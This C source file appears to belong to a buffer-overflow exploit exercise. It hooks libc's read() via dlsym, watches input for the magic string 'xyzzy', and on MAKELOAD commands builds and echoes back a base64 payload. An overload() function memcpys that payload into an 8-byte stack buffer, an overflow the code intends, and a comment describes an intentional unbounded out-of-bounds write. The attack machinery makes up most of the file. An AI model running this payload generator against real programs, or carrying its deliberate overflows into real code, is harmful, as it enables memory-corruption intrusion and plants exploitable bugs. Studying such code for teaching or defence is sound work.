#define _GNU_SOURCE
#include <assert.h>
#include <dlfcn.h>	// For dlsym()
#include <stdio.h>	// For i/o
#include <string.h>	// For str...() and mem...()

#include "addresses.h"
#include "base64.h"
#include "payload.h"
#include "strnstr.h"

static const char s_basemagic[]	= "xyzzy";
static const char s_makeload[]	= "MAKELOAD";
static const char s_dumpload[]	= "DUMPLOAD";
static const char s_overload[]	= "OVERLOAD";
static const char s_overflow[]	= "OVERFLOW";

// In-place substitution of request with result. So wrong...
static ssize_t falseEcho(PayloadPtr plp, char *p, ssize_t np, ssize_t nc) {
        // Generate the payload that we will "echo" back
        unsigned char sPayload64[4096];
        size_t nPayload64 = b64Encode((const unsigned char *) plp, sizeof(*plp), sPayload64, sizeof(sPayload64));

        // Make room for the payload (where the request used to be).
        char *src = p + nc;
        char *dst = p + nPayload64 - strlen(s_makeload) + strlen(s_overflow);
        ssize_t delta = dst - src;
        memmove(dst, src, np - nc);

        // Replace s_makeload with s_overflow
        memcpy(p - strlen(s_makeload), s_overflow, strlen(s_overflow));
        p += strlen(s_overflow) - strlen(s_makeload);

        // Place the payload in the newly created space
        memcpy(p, sPayload64, nPayload64);

        return delta;
} // falseEcho()

// IDENTICAL to overflow(), but with two dumpload() calls for debugging.
static void overload(Pointer p, size_t n, BaseAddressesPtr baseAddressesPtr) {
        char buffer[8] = {'E', 'A', 'S', 'T', 'E', 'R', ' ', 0 };

	dumpload(p, baseAddressesPtr);
	baseAddressesPtr->buf_base = &buffer;
	dofixups(p, n, baseAddressesPtr);
	dumpload(p, baseAddressesPtr);
	memcpy(buffer, p, n);
} // overload()

// Interloper read function that watches for the magic string.
typedef
ssize_t Read(int fd, void *buf, size_t count);
ssize_t read(int fd, void *buf, size_t count) {
	Read *libc_read = (Read *) dlsym(RTLD_NEXT, "read");
	ssize_t result = libc_read(fd, buf, count);

	char *p = (result < (ssize_t) strlen(s_basemagic)) ? NULL : strnstr(buf, s_basemagic, result);

	if (p) {
		p += strlen(s_basemagic);

		BaseAddresses baseAddresses;
		Payload payload;

		initBaseAddresses(&baseAddresses);
		initload(&payload);

		if (!strncmp(s_makeload, p, strlen(s_makeload))) {
			p += strlen(s_makeload);

			ssize_t nc = makeload(&payload, &baseAddresses, p, result - (p - (char *)buf));

			result += falseEcho(&payload, p, result - (p - (char *)buf), nc);

			// Unbounded out-of-bounds write that is intentional and "ok" for us now (considering everything else)
			((char *) buf)[result] = 0;
		} // if
		else if (!strncmp(s_dumpload, p, strlen(s_dumpload)))
			dumpload(&payload, &baseAddresses);
		else if (!strncmp(s_overload, p, strlen(s_overload)))
			overload(&payload, sizeof(payload), &baseAddresses);
	} // if

	return result;
} // read()

#ifdef FULLHOOK_MAIN
int main(int argc, char **argv)
{
	fprintf(stderr, "Running (testing) as an executable\n");

	BaseAddresses baseAddresses;
	initBaseAddresses(&baseAddresses);

	Payload payload;

	initload(&payload);
	makeload(&payload, &baseAddresses, (argc > 1) ? argv[1] : NULL, (argc > 1) ? strlen(argv[1]) : 0);

	char sPayload64[1024];
        size_t nPayload64 = b64Encode((const unsigned char *) &payload, sizeof(payload), sPayload64, sizeof(sPayload64));
	fprintf(stderr, "Base64 encoded payload:\n%s%s%s\n", s_basemagic, s_overflow, sPayload64);

	overload(&payload, sizeof(payload), &baseAddresses);
} // main()
#endif
